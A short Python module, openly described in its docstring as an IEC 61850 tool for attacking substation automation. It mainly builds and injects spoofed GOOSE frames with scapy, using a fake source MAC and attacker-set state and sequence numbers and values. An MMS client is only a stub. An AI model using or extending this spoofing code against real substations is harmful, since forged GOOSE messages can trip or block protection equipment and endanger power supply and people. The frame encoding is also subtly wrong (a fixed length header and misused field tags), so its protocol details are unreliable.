"""
IEC 61850 protocol implementation for substation automation attacks.
"""
import asyncio
from typing import Optional, List, Dict
import socket
import struct


class GOOSESender:
    def __init__(self, interface: str = "eth0"):
        self.interface = interface

    def send_goose(self, go_id: str, dst_mac: str, vlan_id: int, stnum: int, sqnum: int, data_set: str, values: list):
        import scapy.all as scapy
        dst_mac_bytes = bytes.fromhex(dst_mac.replace(":", ""))
        eth = scapy.Ether(dst=dst_mac_bytes, src="00:11:22:33:44:55", type=0x88B8)
        goose_payload = self._build_goose_pdu(go_id, stnum, sqnum, data_set, values)
        pkt = eth / scapy.Raw(load=goose_payload)
        if vlan_id:
            pkt = scapy.Dot1Q(vlan=vlan_id) / pkt
        scapy.sendp(pkt, iface=self.interface, verbose=False)

    def _build_goose_pdu(self, go_id: str, stnum: int, sqnum: int, data_set: str, values: list) -> bytes:
        payload = b"\x61\x81\xF6\x80\x01\x00\xA6\x81"
        go_id_encoded = go_id.encode()
        payload += bytes([len(go_id_encoded)]) + go_id_encoded
        data_set_encoded = data_set.encode()
        payload += bytes([0xA2, len(data_set_encoded)]) + data_set_encoded
        payload += bytes([0x83, 0x01, stnum & 0xFF])
        payload += bytes([0x84, 0x01, sqnum & 0xFF])
        payload += self._encode_values(values)
        return payload

    def _encode_values(self, values: list) -> bytes:
        result = b""
        for v in values:
            if isinstance(v, bool):
                result += bytes([0x83, 0x01, 1 if v else 0])
            elif isinstance(v, int):
                result += bytes([0x84, 0x04]) + v.to_bytes(4, 'big')
            elif isinstance(v, float):
                result += bytes([0x84, 0x04]) + struct.pack('>f', v)
            else:
                encoded = str(v).encode()
                result += bytes([0x85, len(encoded)]) + encoded
        return result


class MMSClient:
    def __init__(self, host: str, port: int = 102):
        self.host = host
        self.port = port

    async def get_name_list(self) -> list:
        raise NotImplementedError("MMS over TPKT requires libIEC61850")
